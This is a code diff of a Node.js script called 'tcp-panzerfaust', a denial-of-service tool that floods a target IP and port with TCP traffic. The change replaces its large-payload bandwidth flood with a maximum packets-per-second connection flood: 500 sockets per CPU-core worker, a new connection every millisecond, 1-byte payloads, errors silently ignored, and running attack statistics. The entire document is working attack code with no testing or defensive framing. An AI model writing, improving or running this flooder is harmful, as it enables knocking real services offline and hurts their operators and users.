@@ -7,17 +7,15 @@ const port = parseInt(process.argv[3]) || 80;
 const duration = parseInt(process.argv[4]);
 
 if (!target || isNaN(duration)) {
-  console.log('Usage: node tcp-panzerfaust-heavy-multi.js <target_ip> <port> <duration_seconds>');
+  console.log('Usage: node tcp-panzerfaust-pps.js <target_ip> <port> <duration_seconds>');
   process.exit(1);
 }
 
 const endTime = Date.now() + duration * 1000;
-const payloadSize = 1472;
-const payload = Buffer.alloc(payloadSize);
 const cpuCount = os.cpus().length;
-const socketsPerWorker = 100;
+const socketsPerWorker = 500;
+const payload = Buffer.alloc(1); // 1 byte for max PPS
 
-// Format helpers
 function formatNumber(n) {
   const units = ['', 'K', 'M', 'B', 'T'];
   let i = 0;
@@ -28,28 +26,17 @@ function formatNumber(n) {
   return `${n.toFixed(2)}${units[i]}`;
 }
 
-function formatBytes(bytes) {
-  const units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
-  let i = 0;
-  while (bytes >= 1024 && i < units.length - 1) {
-    bytes /= 1024;
-    i++;
-  }
-  return `${bytes.toFixed(2)} ${units[i]}`;
-}
-
 if (cluster.isMaster) {
-  let totalSent = 0;
-  let totalBytes = 0;
+  let totalPackets = 0;
+  let maxPPS = 0;
 
   console.clear();
-  console.log('TCP-PANZERFAUST [HEAVY]');
+  console.log('TCP-PANZERFAUST [MAX PPS]');
   console.log('--------------------------------------');
-  console.log(`Target:                ${target}:${port}`);
-  console.log(`Duration:              ${duration}s`);
-  console.log(`Payload:               ${payloadSize} bytes`);
-  console.log(`Cores:                 ${cpuCount}`);
-  console.log(`Sockets/Core:          ${socketsPerWorker}`);
+  console.log(`Target:         ${target}:${port}`);
+  console.log(`Duration:       ${duration}s`);
+  console.log(`Cores:          ${cpuCount}`);
+  console.log(`Sockets/Core:   ${socketsPerWorker}`);
   console.log('Launching...\n');
 
   for (let i = 0; i < cpuCount; i++) cluster.fork();
@@ -57,21 +44,22 @@ if (cluster.isMaster) {
   for (const id in cluster.workers) {
     cluster.workers[id].on('message', (msg) => {
       if (msg.type === 'stats') {
-        totalSent += msg.sent;
-        totalBytes += msg.bytes;
+        totalPackets += msg.pps;
+        if (msg.pps > maxPPS) maxPPS = msg.pps;
       }
     });
   }
 
   setInterval(() => {
     console.clear();
-    console.log('TCP-PANZERFAUST [HEAVY]');
+    console.log('TCP-PANZERFAUST [MAX PPS]');
     console.log('--------------------------------------');
-    console.log(`Total Packets Sent:    ${formatNumber(totalSent)}`);
-    console.log(`Data Sent:             ${formatBytes(totalBytes)}`);
-    console.log(`Target:                ${target}:${port}`);
-    console.log(`Payload:               ${payloadSize} bytes`);
+    console.log(`Total Packets Sent:  ${formatNumber(totalPackets)}`);
+    console.log(`Max PPS:             ${formatNumber(maxPPS)}`);
+    console.log(`Target:              ${target}:${port}`);
+    console.log(`Payload:             ${payload.length} byte`);
     console.log('--------------------------------------');
+    maxPPS = 0;
   }, 2000);
 
   setTimeout(() => {
@@ -81,45 +69,32 @@ if (cluster.isMaster) {
   }, duration * 1000);
 
 } else {
-  let sent = 0;
-  let bytes = 0;
+  let pps = 0;
 
-  function connectAndFlood() {
-    const socket = net.createConnection({ host: target, port: port }, () => {
-      socket.setNoDelay(true);
+  function spam() {
+    function connectOnce() {
+      if (Date.now() > endTime) return;
 
-      function sendLoop() {
-        if (Date.now() > endTime) return socket.destroy();
+      const socket = net.createConnection({ host: target, port: port }, () => {
+        socket.setNoDelay(true);
+        socket.write(payload, () => {
+          pps++;
+          socket.destroy();
+        });
+      });
 
-        try {
-          for (let i = 0; i < 25; i++) {
-            socket.write(payload);
-            sent++;
-            bytes += payloadSize;
-          }
-        } catch (err) {
-          // Ignore send errors
-        }
+      socket.on('error', () => {});
+    }
 
-        setImmediate(sendLoop);
-      }
-
-      sendLoop();
-    });
-
-    socket.on('error', () => setTimeout(connectAndFlood, 100));
-    socket.on('close', () => {
-      if (Date.now() < endTime) setTimeout(connectAndFlood, 100);
-    });
+    for (let i = 0; i < socketsPerWorker; i++) {
+      setInterval(connectOnce, 1); // Aggressive connect rate
+    }
   }
 
-  for (let i = 0; i < socketsPerWorker; i++) {
-    connectAndFlood();
-  }
+  spam();
 
   setInterval(() => {
-    process.send({ type: 'stats', sent, bytes });
-    sent = 0;
-    bytes = 0;
+    process.send({ type: 'stats', pps });
+    pps = 0;
   }, 1000);
 }
